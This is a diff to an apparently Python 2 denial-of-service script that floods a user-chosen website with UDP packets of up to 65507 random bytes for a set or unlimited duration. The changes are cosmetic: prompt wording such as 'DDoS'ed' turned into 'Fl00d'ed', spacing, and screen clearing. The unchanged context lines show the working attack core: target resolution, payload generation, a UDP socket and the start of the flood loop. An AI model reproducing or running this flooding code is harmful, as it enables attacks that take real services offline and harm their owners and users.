@@ -6,12 +6,7 @@ import os
 
 from time import sleep
 
-if sys.platform == "linux2":
-	os.system("clear")
-elif sys.platform == "win32":
-	os.system("cls")
-else:
-	os.system("clear")
+os.system("clear")
 ###############################
 class color:
    PURPLE = '\033[95m'
@@ -69,24 +64,24 @@ def UDoS():
 	time.sleep(0.1)
 	print ''
 	print ''
-	target = raw_input(color.PURPLE + color.BOLD +"                          Target (Enter website address to be DDoS'ed):> ")
+	target = raw_input(color.PURPLE + color.BOLD +"                      Target (Enter website address to be Fl00d'ed):> ")
        	host_ip=socket.gethostbyname(target)
 	print(color.RED + "                                         Target set ---> %s " % (target))
 	print(color.BOLD+"                  +=====================================================================+")
 	time.sleep(0.3)
 	print ""
-	package = input(color.BLUE + color.BOLD +"                                         Size (MAX 65507): ")
+	package = input(color.BLUE + color.BOLD +"                                     Packet Size (MAX 65507): ")
 	print(color.RED + "                      Target to be attacked with packets of data --->  %s" % (package))
 	print(color.BOLD+"                  +=====================================================================+")
 	time.sleep(0.3)
 	print ""
-	duration = input(color.GREEN + color.BOLD +"                                   Duration (0 is infinite): ")
-	print(color.RED + "                            Time duration of the attack ---> %s " % (duration) + color.END)
+	duration = input(color.GREEN + color.BOLD +"                                      Duration (0 is infinite): ")
+	print(color.RED + "                                  Time duration of the attack ---> %s " % (duration) + color.END)
 	durclock = (lambda:0, time.clock)[duration > 0]
 	duration = (1, (durclock() + duration))[duration > 0]
 	packet = random._urandom(package)
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	print(color.BOLD+"                  +=====================================================================+")
+	print(""+R+color.BOLD+"                  +=====================================================================+")
 	print ""
 	print("               The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
 	while True:
